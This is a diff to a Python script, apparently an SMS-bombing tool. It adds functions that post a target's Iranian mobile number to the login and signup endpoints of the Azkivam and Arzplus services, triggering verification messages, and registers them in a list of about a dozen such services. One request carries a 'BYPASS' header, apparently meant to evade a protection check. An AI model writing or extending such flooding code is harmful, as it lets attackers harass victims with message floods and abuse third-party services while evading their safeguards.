@@ -253,14 +253,33 @@ def azno(phone):
     except: return False
 
 
+def azkivam(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://api.azkivam.com/auth/login", json={"mobileNumber": phone, "source": None}, headers={"Origin": "https://azkivam.com", "Referer": "https://azkivam.com/", "x-zrk-cs": "BYPASS"}, timeout=10)
+        print(f"[{'+' if r.status_code == 200 else '-'}] Azkivam: {r.status_code}")
+        return r.status_code == 200
+    except: return False
 
+
+
+
+def arzplus(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://api.arzplus.net/api/v1/accounts/signup/init/", json={"phone": phone}, headers={"Origin": "https://arzplus.net", "Referer": "https://arzplus.net/"}, timeout=10)
+        print(f"[{'+' if r.status_code == 200 else '-'}] Arzplus: {r.status_code}")
+        return r.status_code == 200
+    except: return False
 
 
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno, arzplus, azkivam
 ]
 
 # ==========================
